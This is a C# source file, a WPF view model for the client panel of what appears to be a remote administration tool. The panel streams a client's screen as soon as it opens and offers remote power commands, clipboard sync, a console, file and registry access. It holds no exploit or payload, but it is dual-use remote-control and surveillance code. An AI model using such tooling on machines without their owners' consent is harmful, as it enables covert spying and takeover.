﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Windows.Media.Imaging;
using SystemInformation.Administration.ViewModels;
using SystemUtilities.Administration.Rest;
using Anapher.Wpf.Swan.ViewInterface;
using Autofac;
using ClientPanel.Administration.Rest;
using ClipboardManager.Administration.Utilities;
using Console.Administration.ViewModels;
using FileExplorer.Administration.ViewModels;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Extensions;
using Orcus.Administration.Library.Models;
using Orcus.Administration.Library.Services;
using Orcus.Administration.Library.ViewModels;
using Orcus.Utilities;
using Prism.Commands;
using Prism.Regions;
using RegistryEditor.Administration.ViewModels;
using RemoteDesktop.Administration.Channels;
using RemoteDesktop.Administration.Rest;
using RemoteDesktop.Shared.Options;
using TaskManager.Administration.ViewModels;
using Unclassified.TxLib;

namespace ClientPanel.Administration.ViewModels
{
    public class ClientPanelViewModel : ViewModelBase
    {
        private readonly ClientViewModel _clientViewModel;
        private readonly IOrcusRestClient _orcusRestClient;
        private readonly IPackageRestClient _remoteDesktopRestClient;
        private readonly IPackageRestClient _restClient;
        private readonly IWindow _window;
        private readonly IWindowService _windowService;
        private readonly ClipboardSynchronizer _clipboardSynchronizer;
        private DelegateCommand<ButtonAction> _executeButtonActionCommand;
        private bool _isClipboardSynchronizationEnabled;
        private bool _isToolsOpen;
        private DelegateCommand _openConsoleCommandCommand;
        private DelegateCommand _openFileExplorerCommand;
        private DelegateCommand _openRegistryEditorCommand;
        private DelegateCommand _openSystemInfoCommand;
        private DelegateCommand _openTaskManagerCommand;
        private DelegateCommand _openToolsCommand;
        private WriteableBitmap _remoteImage;
        private string _title;

        public ClientPanelViewModel(ITargetedRestClient restClient, IOrcusRestClient orcusRestClient, ClientViewModel clientViewModel, IWindow window,
            IWindowService windowService, ClipboardSynchronizer clipboardSynchronizer)
        {
            _orcusRestClient = orcusRestClient;
            _windowService = windowService;
            _clipboardSynchronizer = clipboardSynchronizer;
            _clientViewModel = clientViewModel;
            _window = window;

            _remoteDesktopRestClient = restClient.CreatePackageSpecific("RemoteDesktop");
            _restClient = restClient.CreatePackageSpecific("ClientPanel");

            Title = $"{clientViewModel.Username} [{clientViewModel.LatestSession.IpAddress}]";
            ComputerPowerCommands = new List<ButtonAction>
            {
                new ButtonAction(Tx.T("ClientPanel:Power.LogOff"), () => SystemPowerResource.LogOff(restClient)),
                new ButtonAction(Tx.T("ClientPanel:Power.Shutdown"), () => SystemPowerResource.Shutdown(restClient)),
                new ButtonAction(Tx.T("ClientPanel:Power.Restart"), () => SystemPowerResource.Restart(restClient))
            };
            SystemProgramsCommands = new List<ButtonAction>
            {
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.TaskManager"), () => ProgramsResource.StartTaskManager(restClient)),
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.RegEdit"), () => ProgramsResource.StartRegEdit(restClient)),
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.DeviceManager"), () => ProgramsResource.StartDeviceManager(restClient)),
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.ControlPanel"), () => ProgramsResource.StartControlPanel(restClient)),
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.ComputerManagement"), () => ProgramsResource.StartComputerManagement(restClient)),
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.EventLog"), () => ProgramsResource.StartEventLog(restClient)),
                new ButtonAction(Tx.T("ClientPanel:RemotePrograms.Services"), () => ProgramsResource.StartServices(restClient))
            };
        }

        public string Title
        {
            get => _title;
            set => SetProperty(ref _title, value);
        }

        public bool IsToolsOpen
        {
            get => _isToolsOpen;
            set => SetProperty(ref _isToolsOpen, value);
        }

        public bool IsClipboardSynchronizationEnabled
        {
            get => _isClipboardSynchronizationEnabled;
            set
            {
                if (SetProperty(ref _isClipboardSynchronizationEnabled, value))
                {
                    if (value) _clipboardSynchronizer.Enable().Forget();
                    else _clipboardSynchronizer.Disable();
                }
            }
        }

        public WriteableBitmap RemoteImage
        {
            get => _remoteImage;
            set => SetProperty(ref _remoteImage, value);
        }

        public List<ButtonAction> ComputerPowerCommands { get; }
        public List<ButtonAction> SystemProgramsCommands { get; }

        public DelegateCommand OpenToolsCommand
        {
            get { return _openToolsCommand ?? (_openToolsCommand = new DelegateCommand(() => IsToolsOpen = !IsToolsOpen)); }
        }

        public DelegateCommand OpenTaskManagerCommand
        {
            get
            {
                return _openTaskManagerCommand ?? (_openTaskManagerCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(TaskManagerViewModel), Tx.T("TaskManager:TaskManager"));
                }));
            }
        }

        public DelegateCommand OpenFileExplorerCommand
        {
            get
            {
                return _openFileExplorerCommand ?? (_openFileExplorerCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(FileExplorerViewModel), Tx.T("FileExplorer:FileExplorer"));
                }));
            }
        }

        public DelegateCommand OpenSystemInfoCommand
        {
            get
            {
                return _openSystemInfoCommand ?? (_openSystemInfoCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(SystemInformationViewModel), Tx.T("SystemInformation:SystemInformation"));
                }));
            }
        }

        public DelegateCommand OpenRegistryEditorCommand
        {
            get
            {
                return _openRegistryEditorCommand ?? (_openRegistryEditorCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(RegistryEditorViewModel), Tx.T("RegistryEditor:Name"));
                }));
            }
        }

        public DelegateCommand OpenConsoleCommandCommand
        {
            get
            {
                return _openConsoleCommandCommand ?? (_openConsoleCommandCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(ConsoleViewModel), Tx.T("Console:Name"));
                }));
            }
        }

        public DelegateCommand<ButtonAction> ExecuteButtonActionCommand
        {
            get
            {
                return _executeButtonActionCommand ?? (_executeButtonActionCommand = new DelegateCommand<ButtonAction>(async parameter =>
                {
                    if (parameter == null)
                        return;

                    try
                    {
                        await parameter.Action();
                    }
                    catch (Exception e)
                    {
                        e.ShowMessage(_window);
                    }
                }));
            }
        }

        private void OpenCommandWindow(Type viewModelType, string title)
        {
            _windowService.Show(viewModelType, title, _window, null, builder =>
            {
                builder.RegisterInstance(_clientViewModel);
                builder.RegisterInstance(_orcusRestClient.CreateTargeted(_clientViewModel));
            });
        }

        public override async void OnNavigatedTo(NavigationContext navigationContext)
        {
            base.OnNavigatedTo(navigationContext);

            var parameters = await RemoteDesktopResource.GetParameters(_remoteDesktopRestClient);
            var monitor = parameters.Screens.FirstOrDefault(x => x.IsPrimary) ?? parameters.Screens.First();

            var remoteDesktop = await RemoteDesktopResource.CreateScreenChannel(
                new DesktopDuplicationOptions {Monitor = {Value = Array.IndexOf(parameters.Screens, monitor)}}, new x264Options(),
                _remoteDesktopRestClient);
            remoteDesktop.PropertyChanged += RemoteDesktopOnPropertyChanged;
            await remoteDesktop.StartRecording(_remoteDesktopRestClient);
        }

        private void RemoteDesktopOnPropertyChanged(object sender, PropertyChangedEventArgs e)
        {
            var remoteDesktop = (RemoteDesktopChannel) sender;
            switch (e.PropertyName)
            {
                case nameof(RemoteDesktopChannel.Image):
                    RemoteImage = remoteDesktop.Image;
                    break;
            }
        }
    }
}